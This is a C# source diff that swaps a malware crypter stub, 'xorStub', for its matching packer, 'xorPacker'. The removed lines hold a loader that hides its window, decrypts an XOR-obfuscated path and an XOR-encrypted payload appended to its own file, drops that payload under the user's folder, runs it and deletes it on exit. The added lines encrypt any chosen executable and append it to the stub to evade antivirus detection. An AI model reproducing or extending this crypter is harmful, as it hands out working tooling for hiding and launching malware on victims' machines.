@@ -2,19 +2,17 @@ using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
-using System.Text;
+using System.Drawing;
 using System.IO;
-using System.Diagnostics;
-using System.Management;
-using System.Runtime.InteropServices;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
 
-namespace xorStub
+namespace xorPacker
 {
     class Program
     {
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        public static string ROT13Encode(string data, string key)
+        public static string XORCipher(string data, string key)
         {
             int dataLen = data.Length;
             int keyLen = key.Length;
@@ -27,61 +25,51 @@ namespace xorStub
 
             return new string(output);
         }
-        static class RandomUtil
-        {
-            public static string GetRandomString()
-            {
-                string path = Path.GetRandomFileName();
-                path = path.Replace(".", "");
-                return path;
-            }
-        }
 
         static void Main(string[] args)
         {
-            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
-            ShowWindow(h, 0);
-            while (true)
+            int length = 25;
+            StringBuilder str_build = new StringBuilder();
+            Random random = new Random();
+
+            char letter;
+
+            for (int i = 0; i < length; i++)
             {
-                using (StreamReader streamReader = new StreamReader(System.Reflection.Assembly.GetEntryAssembly().Location))
+                double flt = random.NextDouble();
+                int shift = Convert.ToInt32(Math.Floor(25 * flt));
+                letter = Convert.ToChar(shift + 65);
+                str_build.Append(letter);
+            }
+
+            Console.Write("PE to pack : ");
+            string exe = Console.ReadLine();
+            File.WriteAllBytes(Directory.GetCurrentDirectory() + "\\" + "packed_exe.exe", Properties.Resources.xorStub);
+   
+            try
             {
-                using (BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream))
+                Byte[] bytes = File.ReadAllBytes(exe);
+                Console.WriteLine("[*] PE (works with .NET) : " + exe);
+                String file = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(XORCipher(Convert.ToBase64String(bytes), str_build.ToString())));
+                String randomKey = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(XORCipher(str_build.ToString(), "randomkey")));
+
+                using (FileStream filestream = new FileStream("packed_exe.exe", FileMode.Open, FileAccess.ReadWrite, FileShare.None))
                 {
-                    byte[] stubBytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
-                    string stubSettings = Encoding.ASCII.GetString(stubBytes).Substring(Encoding.ASCII.GetString(stubBytes).IndexOf("***")).Replace("***", "");
-                    string randomKey = ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(stubSettings.Split('|')[1])), "randomkey");
-                    string cipheredFile = stubSettings.Split('|')[0];
-                    string fileName = RandomUtil.GetRandomString();
-
-                    string[] CurrentDirectoryy = new string[]
+                    using (BinaryWriter binaryWriter = new BinaryWriter(filestream))
                     {
-                        ROT13Encode("{", "AAAQSDQSDF"),
-                        ROT13Encode(" !# ", "QSDQSFFF"),
-                        ROT13Encode("#4200", "QSDQSDQFGHG"),
-                        ROT13Encode("')-$", "JHJLHJKYTUTYU"),
-                        ROT13Encode("!>6", "QDSFDFHNGFGN"),
-                        ROT13Encode("v&.2", "XCVW<X<WCBN")
-                    };
-
-                    Byte[] bytesBack = Convert.FromBase64String(ROT13Encode(Encoding.UTF8.GetString(Convert.FromBase64String(cipheredFile)), randomKey));
-                    File.WriteAllBytes(CurrentDirectoryy[0] + "\\" + CurrentDirectoryy[1] + "\\" + System.Environment.UserName + "\\" + CurrentDirectoryy[2] + "\\" + CurrentDirectoryy[3] + "\\" + CurrentDirectoryy[4] + "\\" + fileName + CurrentDirectoryy[5], bytesBack);
-
-                    Process p = new Process();
-                    p.Exited += new EventHandler(p_Exited);
-                    p.StartInfo.FileName = CurrentDirectoryy[0] + "\\" + CurrentDirectoryy[1] + "\\" + System.Environment.UserName + "\\" + CurrentDirectoryy[2] + "\\" + CurrentDirectoryy[3] + "\\" + CurrentDirectoryy[4] + "\\" + fileName + CurrentDirectoryy[5];
-                    p.EnableRaisingEvents = true;
-                    p.Start();
-
-                    void p_Exited(object sender, EventArgs e)
-                    {
-                        File.Delete(CurrentDirectoryy[0] + "\\" + CurrentDirectoryy[1] + "\\" + System.Environment.UserName + "\\" + CurrentDirectoryy[2] + "\\" + CurrentDirectoryy[3] + "\\" + CurrentDirectoryy[4] + "\\" + fileName + CurrentDirectoryy[5]);
-                        Environment.Exit(0);
+                        filestream.Position = filestream.Length + 1;
+                        binaryWriter.Write("***" + file + "|" + randomKey);
+                        Console.WriteLine("[!] PE packed");
                     }
-
-                    Console.ReadLine();
                 }
+
+            } 
+            
+            catch (System.IO.FileNotFoundException) {
+                Console.WriteLine("File does not exist.");
             }
-            }
+            
+            Console.ReadLine();
         }
     }
 }
